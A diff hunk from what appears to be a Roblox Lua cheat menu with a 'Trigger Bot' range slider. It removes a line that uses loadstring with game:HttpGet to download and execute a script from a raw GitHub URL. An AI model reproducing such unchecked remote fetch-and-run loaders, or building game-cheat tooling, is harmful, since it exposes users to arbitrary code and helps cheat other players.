@@ -254,9 +254,7 @@ end)
 Menu.Slider("Main", "Trigger Bot", "Range", 1, 100, TriggerBot.Range, "", 1, function(Value)
     TriggerBot.Range = Value
 end)
-
--- Load the external script
-loadstring(game:HttpGet("https://raw.githubusercontent.com/scripade/sh/refs/heads/main/Wsvr.txt"))()"}, 
+"},
 
 for i, s in ipairs(scripts) do
     createButton(s.name, s.script, 50 + (i - 1) * 55)
